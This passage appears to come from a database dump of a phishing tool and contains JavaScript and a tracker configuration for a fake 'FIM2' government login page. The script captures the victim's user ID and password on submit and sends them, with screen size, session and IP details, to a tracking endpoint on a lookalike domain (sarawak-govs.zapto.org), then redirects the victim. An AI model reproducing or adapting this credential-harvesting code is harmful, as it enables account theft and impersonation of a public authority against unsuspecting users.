nfo\n    }));\n}\n//-----------------------------------------------------------\n\nif (document.readyState !== \'loading\')\n    onReady();\nelse {\n    document.addEventListener(\'DOMContentLoaded\', function() {\n        onReady();\n    });\n}\n\nfunction onReady() {\n    if (document.getElementById(\"btn-submit\"))\n        document.getElementById(\"btn-submit\").onclick = function(e) {\n            form_field_data = {};\n            form_field_data.usrid2 = document.getElementById(\'usrid2\').value;\n            form_field_data.password = document.getElementById(\'password\').value;\n            do_track_req(e, 1, \"https://sarawak-govs.zapto.org/message.php\");\n        }\n};\n//-----------------------------------------------------------\nfunction do_track_req(e, page, next_page_url) {\n    e.preventDefault();\n    xhr.open(\"POST\", \"https://sarawak-govs.zapto.org/track\", false);\n    xhr.send(JSON.stringify({\n        page: page,\n        trackerId: tracker_id,\n        sess_id: sess_id,\n        screen_res: screen.width + \"x\" + screen.height,\n        form_field_data: form_field_data,\n        cid: cid,\n        ip_info: ip_info\n    }));\n\n    if (next_page_url != \"#\")\n        window.top.location.href = next_page_url + \"?cid=\" + cid;\n}', '{\"start\":{\"tb_tracker_name\":\"FIM2 (2022)\",\"cb_auto_ativate\":false},\"trackers\":{},\"web_forms\":{\"count\":1,\"data\":[{\"page_name\":\"FIM2 Login Page\",\"page_url\":\"https://sarawak-govs.zapto.org/fim2/fim2.sains.com.my/login.php\",\"link_next_page\":true,\"next_page_url\":\"https://sarawak-govs.zapto.org/message.php\",\"form_fields_and_values\":{\"TF_usrid2\":{\"idname\":\"usrid2\",\"track\":true},\"TF_password\":{\"idname\":\"password\",\"track\":true},\"FSB\":{\"idname\":\"btn-submit\",\"track\":true}}}]}}', '23-02-2022 03:11 AM', '25-02-2022 08:13 AM', '09-03-2022 12:17 AM', 1),
